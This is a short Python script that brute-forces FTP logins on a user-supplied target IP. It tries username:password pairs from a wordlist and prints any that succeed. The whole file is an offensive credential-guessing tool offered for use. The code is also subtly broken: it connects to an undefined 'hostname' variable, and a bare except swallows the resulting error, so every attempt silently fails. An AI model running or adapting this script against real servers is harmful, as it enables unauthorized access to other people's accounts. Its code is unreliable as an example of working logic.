import ftplib



def bruteLogin(host, passdFile):
    try:
        pF = open(passdFile, "r")
    except:
        print("file Not exist")
        quit(0)
    for line in pF.readlines():
        username = line.split(':')[0]
        password = line.split(':')[1].strip('\n')
        print(" trying: " + username + "//" + password)
        try:

            ftp=ftplib.FTP(hostname)

            login = ftp.login(username, password)
            print(" login Suceed with: " + username + " / " + password)
            ftp.quit()
            return(username, password)
            #return(username, password)
        except:
            pass
        print(" password not in the list")



host= input("[#] Target ip addresss ")
passdFile = input("[+] password list")
bruteLogin(host, passdFile)
